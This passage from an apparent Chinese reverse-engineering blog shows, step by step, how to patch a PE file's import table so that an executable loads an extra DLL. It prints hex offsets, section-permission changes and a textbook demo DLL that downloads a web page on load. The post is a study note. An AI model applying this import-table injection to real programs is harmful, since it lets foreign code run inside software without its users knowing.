src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/3.png" class=""><p>选中蓝色背景是第一个IMAGE_IMPORT_DESCRIPTOR结构体，往后每一个颜色的框都是一个IMAGE_IMPORT_DESCRIPTOR结构体，最后以黄色全NULL标志结束，因此示例程序导入的dll有4个，使用软件验证：</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/4.png" class=""><p>本节通过修改PE文件里的内容达到载入DLL的目的，因此思路就有了：往文件偏移地址0x000076CC的末尾，黄色框处填补要导入的dll构造对应的_IMAGE_IMPORT_DESCRIPTOR结构体，这里人就需要一个全null的_IMAGE_IMPORT_DESCRIPTOR结构体结尾保持PE格式的完成，显然强行操作会覆盖到后续的内容（这可能导致PE文件无法正常的运行）</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/3.png" class=""><p>因此需要考虑将块内容进行搬迁。将搬迁后的IDT地址以及size写回Optionalheader.datadirector[1]。搬迁方案有三：</p><ul><li>查找文件空白区域</li><li>增加文件最后一个节区的大小</li><li>在文件末尾添加新节区</li></ul><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><h4 id="查找文件空白区域"><a href="#查找文件空白区域" class="headerlink" title="查找文件空白区域"></a>查找文件空白区域</h4><p>利用PE文件映射到内存中由于对齐产生的NULL区域，先查看对齐的相关：IMAGE_OPTIONAL_HEADER.SectionAlignment &amp; FileAlignment:</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/5.png" class=""><p>SectionAlignment &#x3D; 0x00001000  FIleAlignment &#x3D; 0x00000200，结合节区头信息：</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/2.png" class=""><p>画出.text 和 .rdata映射示意图：</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/6.png" class=""><p>由于节区载入内存的对其关系，使得.text .rdata节区都有200字节的null空白区域</p><p>节区.text空白区域地址转化的结果：   0x5C7C -&gt; <strong>0x507C ～0x5200</strong></p><p>节区.rdata空白区域地址转化的结果：0x8C56 -&gt; <strong>0x7E56 ～ 0x8000</strong>，显然上面所列的节区中包含的空白区域都是足够写入扩容后的IDT信息的。这里使用节区.rdata的空白区域（<strong>0x7E56 ～ 0x8000</strong>）写入搬迁后的IDT</p><h4 id="构建新的-IMAGE-IMPORT-DESCRIPTOR"><a href="#构建新的-IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="构建新的_IMAGE_IMPORT_DESCRIPTOR"></a>构建新的_IMAGE_IMPORT_DESCRIPTOR</h4><p>确定写入的区域后，需要构造导入新dll的结构体_IMAGE_IMPORT_DESCRIPTOR</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">DWORD Characteristics;</span><br><span class="line">DWORD OriginalFirstThunk;<span class="comment">//INT(Import Name Table) address (RVA)</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD TimeDateStamp;</span><br><span class="line">DWORD ForwarderChain;</span><br><span class="line">DWORD Name;<span class="comment">//library name string address (RVA)</span></span><br><span class="line">DWORD FirstThunk;<span class="comment">//IAT(Import Address Table) address (RVA)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>这部分是需要结合要导入的DLL源文件</p><p>待插入DLL – myhack3.dll源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;shlobj.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Wininet.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Wininet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//略</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 出现在IDT 中的dummy export function...</span></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">dummy</span><span class="params">()</span><span class="comment">//保证形式完整的需要</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要了解一点关于dll文件的知识：</p><blockquote><p>__declspec是Microsoft VC中专用的关键字，它配合着一些属性可以对标准C&#x2F;C++进行扩充。__declspec关键字应该出现在声明的前面。</p><p>__declspec(dllexport)用于Windows中的动态库中，声明导出函数、类、对象等供外面调用，省略给出.def文件。即将函数、类等声明为导出函数，供其它程序调用，<strong>作为动态库的对外接口函数、类</strong>等。</p></blockquote><p>也就是说需要在PE文件的_IMAGE_IMPORT_DESCRIPTOR设置导入的函数为__declspec修饰的dummy函数，则会完成相应dll的载入？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">DWORD Characteristics;</span><br><span class="line">DWORD OriginalFirstThunk;<span class="comment">//pointer to string dummy</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD TimeDateStamp;<span class="comment">//00</span></span><br><span class="line">DWORD ForwarderChain;<span class="comment">//00</span></span><br><span class="line">DWORD Name;<span class="comment">//pointer to dll name myhack3.dll</span></span><br><span class="line">DWORD FirstThunk;<span class="comment">//pointer to string dummy</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_BY_NAME</span> &#123;</span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>关于Hint成员的作用，<a href="http://masm32.com/board/index.php?topic=6145.0">描述来源</a>：</p><blockquote><p>Hint contains the index into the export table of the DLL the function resides in. This field is for use by the PE loader so it can look up the function in the DLL’s export table quickly.<strong>This value is not essential</strong> and some linkers may set the value in this field to 0.</p><p>并不是必须设置的成员，但空间需要保留，设置了可以让PE装载器快速从DLL导出表中获取相关的函数信息</p></blockquote><p>关于这几个结构体的关系，在网上找到了描述得比较好的，感谢互联网：</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/7.png" class=""><p>经过上面的分析，在空白区域写入构建结构体_IMAGE_IMPORT_DESCRIPTOR需要的内容</p><ul><li>dummy字符串（第一个字节内容需要补充hint的值，这里设置00就好）（myhack3.dll中使用关键字__declspec对其进行修饰，表明myhack3.dummy函数作为动态库myhack3.dll的对外接口函数）写入位置</li><li>链接库名称myhack3.dll字符串</li><li><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/8.png" class=""></li></ul><p>_IMAGE_IMPORT_DESCRIPTOR的成员都是以RVA存放的，不难理解，时PE装载器将PE文件载入内存中运行将相应地址写入完成dll函数调用的，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">DWORD Characteristics;</span><br><span class="line">DWORD OriginalFirstThunk;<span class="comment">//0x0000FF50 -&gt; 0x00008D40(RVA)</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD TimeDateStamp;<span class="comment">//0x00000000</span></span><br><span class="line">DWORD ForwarderChain;<span class="comment">//0x00000000</span></span><br><span class="line">DWORD Name;<span class="comment">//0x00007F30  -&gt; 0x00008D30(RVA)</span></span><br><span class="line">DWORD FirstThunk;<span class="comment">//0x0000FF50 -&gt; 0x00008D40(RVA)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>因此，新增的_IMAGE_IMPORT_DESCRIPTOR字节码应该是<code>408D0000 00000000 00000000 308D0000 408D0000</code></p><p>完成_IMAGE_IMPORT_DESCRIPTOR的构造后需要将原来IDT(0x000076CC[RAW])的内容整体搬迁，搬入节区.rdata的空白区域，这里选择的起始地址时0x00007E80（RAW）。</p><h4 id="写入节区的权限问题"><a href="#写入节区的权限问题" class="headerlink" title="写入节区的权限问题"></a>写入节区的权限问题</h4><p>由于意图将IDT写入节区.rdata，当PE装载器装载PE文件需要往IDT中写入实际函数的地址（由于写入的都是偏移地址，需要根据载入的ImageBase等作相应的变动）因此节区.rdata作为相关区域需要具备可写属性，也就是需要修改.rdata节区头中对节区权限的描述成员characteristic：</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/9.png" class=""><p>当前对节区是没有写入的权限的，关于权限描述，由于比较多这里只列出需要用到的，详情查看<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header">官方文档</a></p><table><thead><tr><th>Flag</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>IMAGE_SCN_CNT_INITIALIZED_DATA</strong>0x00000040</td><td>The section contains initialized data.</td></tr><tr><td><strong>IMAGE_SCN_MEM_READ</strong>0x40000000</td><td>The section can be read.</td></tr><tr><td><strong>IMAGE_SCN_MEM_WRITE</strong>0x80000000</td><td>The section can be written to.</td></tr></tbody></table><p>前两个是节区.rdata自身具备的，需要在此基础上往上附加权限，由于该值是使用多个flag对应的值进行OR运算的。</p><p>旧权限0x40000040 &#x3D; 0x00000040 OR 0x40000000，附加上<strong>IMAGE_SCN_MEM_WRITE</strong>0x80000000 &#x3D; 0xC0000040，因此修改.rdata节区头中的characteristic &#x3D; 0xC0000040</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/10.png" class=""><h4 id="写入新的IDT"><a href="#写入新的IDT" class="headerlink" title="写入新的IDT"></a>写入新的IDT</h4><p>接着上文分析，新增的_IMAGE_IMPORT_DESCRIPTOR字节码应该是<code>408D0000 00000000 00000000 308D0000 408D0000</code></p><p>完成_IMAGE_IMPORT_DESCRIPTOR的构造后需要将原来IDT(0x000076CC[RAW])的内容整体搬迁，搬入节区.rdata的空白区域，这里选择的起始地址时0x00007E80（RAW）。</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/11.png" class=""><p>修改结束后需要修改Optionalheader.DataDirectory[1]中关于导入表的字段，新的导入表所在地址 &#x3D; RAW 0x00007E80 &#x3D; RVA 0x00008C80，导入表的SIze &#x3D; 0x00000078</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/12.png" class=""><h4 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意"></a>特别注意</h4><p>这里需要指出的是关于<strong>BOUND IMPORT TABLE</strong> 绑定导入表是一种提高DLL加载速度的技术.对于PE文件而言<strong>是可选项, 不是必须</strong>. 当修改PE文件时, 如果添加导入的DLL文件, 需要注意有没有绑定导入表, 如果有需要删除或修改绑定导入表, 否则会运行时出错.</p><p>由于不是必选项，因此这里直接做null处理，绑定导入表位于Optionalheader.DataDirectory[11]</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/13.png" class=""><p>目标文件中的绑定导入表是null因此不用管</p><h3 id="修改验证"><a href="#修改验证" class="headerlink" title="修改验证"></a>修改验证</h3><p>先在PE查看器中查看是否识别IDT成功</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/14.png" class=""><p>可以看到达到预期的效果载入myhack3.dll</p><p>接下来运行程序，使用进程查看器，看模块myhack3.dll是否加载成功</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/15.png" class=""><p>可以看到dll注入成功，并且dll中的DllMain成功得到执行，由于不是内容重点，这里贴下源码即可：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;shlobj.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Wininet.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Wininet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_BUF_SIZE            (4096)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_URL                 <span class="string">L&quot;http://www.google.com/index.html&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_INDEX_FILE          <span class="string">L&quot;index.html&quot;</span></span></span><br><span class="line"></span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 出现在IDT 中的dummy export function...</span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">dummy</span><span class="params">()</span><span class="comment">//保证形式完整的需要</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DownloadURL</span><span class="params">(LPCTSTR szURL, LPCTSTR szFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//下载网页文件到本地</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">EnumWindowsProc</span><span class="params">(HWND hWnd, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;dwPID);     <span class="comment">//获取开启某个窗口或者新窗口的线程ID</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( dwPID == (DWORD)lParam )</span><br><span class="line">    &#123;</span><br><span class="line">        g_hWnd = hWnd;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HWND <span class="title">GetWindowHandleFromPID</span><span class="params">(DWORD dwPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">EnumWindows</span>(EnumWindowsProc, dwPID);        <span class="comment">//将参数二传递给第一个参数中的回调函数。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g_hWnd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DropFile</span><span class="params">(LPCTSTR wcsFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HWND            hWnd = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD           dwBufSize = <span class="number">0</span>;</span><br><span class="line">    BYTE            *pBuf = <span class="literal">NULL</span>; </span><br><span class="line">    DROPFILES       *pDrop = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>            szFile[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    HANDLE          hMem = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, wcsFile, <span class="number">-1</span>,</span><br><span class="line">                        szFile, MAX_PATH, <span class="literal">NULL</span>, <span class="literal">NULL</span>);  <span class="comment">//转换字符，转换结果保存在szFile的指针对应的buf中</span></span><br><span class="line"></span><br><span class="line">    dwBufSize = <span class="built_in">sizeof</span>(DROPFILES) + <span class="built_in">strlen</span>(szFile) + <span class="number">1</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( !(hMem = <span class="built_in">GlobalAlloc</span>(GMEM_ZEROINIT, dwBufSize)) )   <span class="comment">//开辟内存</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="string">L&quot;GlobalAlloc() failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pBuf = (LPBYTE)<span class="built_in">GlobalLock</span>(hMem);</span><br><span class="line"></span><br><span class="line">    pDrop = (DROPFILES*)pBuf; </span><br><span class="line">    pDrop-&gt;pFiles = <span class="built_in">sizeof</span>(DROPFILES);</span><br><span class="line">    <span class="built_in">strcpy_s</span>((<span class="type">char</span>*)(pBuf + <span class="built_in">sizeof</span>(DROPFILES)), <span class="built_in">strlen</span>(szFile)+<span class="number">1</span>, szFile);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GlobalUnlock</span>(hMem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !(hWnd = <span class="built_in">GetWindowHandleFromPID</span>(<span class="built_in">GetCurrentProcessId</span>())) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="string">L&quot;GetWndHandleFromPID() failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PostMessage</span>(hWnd, WM_DROPFILES, (WPARAM)pBuf, <span class="literal">NULL</span>);    <span class="comment">//传递内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    TCHAR *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">L&quot;ThreadProc() start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, szPath, <span class="built_in">sizeof</span>(szPath));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( p = _tcsrchr(szPath, <span class="string">L&#x27;\\&#x27;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tcscpy_s(p+<span class="number">1</span>, <span class="built_in">wcslen</span>(DEF_INDEX_FILE)+<span class="number">1</span>, DEF_INDEX_FILE);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="string">L&quot;DownloadURL()&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>( <span class="built_in">DownloadURL</span>(DEF_URL, szPath) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">OutputDebugString</span>(<span class="string">L&quot;DropFlie()&quot;</span>);</span><br><span class="line">            <span class="built_in">DropFile</span>(szPath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">L&quot;ThreadProc() end...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">            <span class="built_in">CloseHandle</span>(<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>));  <span class="comment">//回到No.149处</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致完成在宿主进程中创建新线程，在线程中调用回调函数ThreadProc，在同目录下调用DownloadURL下载文件。</p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/16.png" class="">]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python源码剖析No.1--开篇</title>
      <link href="/2022/05/04/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%BC%80%E7%AF%87/"/>
      <url>/2022/05/04/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%BC%80%E7%AF%87/</url>
      
